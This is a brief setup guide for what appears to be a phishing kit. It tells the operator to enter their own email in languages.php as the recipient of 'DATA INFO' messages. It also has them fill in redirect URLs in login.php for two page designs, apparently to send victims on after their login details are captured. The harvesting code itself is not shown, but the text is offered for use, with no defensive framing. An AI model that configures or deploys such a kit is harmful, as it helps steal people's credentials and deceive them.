Open file:
-------------------------
/data/langs/languages.php
-------------------------

Change these lines:
-------------------------------------------------------------
$service = "DATA INFO"; // random name, wil be shown in email
$sen = "your@mail.com"; //PUT EMAIL
---------------------------------------
Open file:
---------------
/data/login.php
---------------

Change these lines: ( go to end of file )
------------------------------------------------------------------------
$rdr = '';
		if ( $v == 1 ) {
			
			$rdr = 'INSERT URL'; //insert url redirect to, for v1 design
		}
		elseif( $v == 2 ) {
			
			$rdr = 'INSERT URL'; //insert url redirect to, for v2 design
		}
		else {
		
			//if EMPTY param v
			$rdr = 'INSERT URL'; //insert url redirect to, for v1 design or another url
		}
-------------------------------------------------------------------------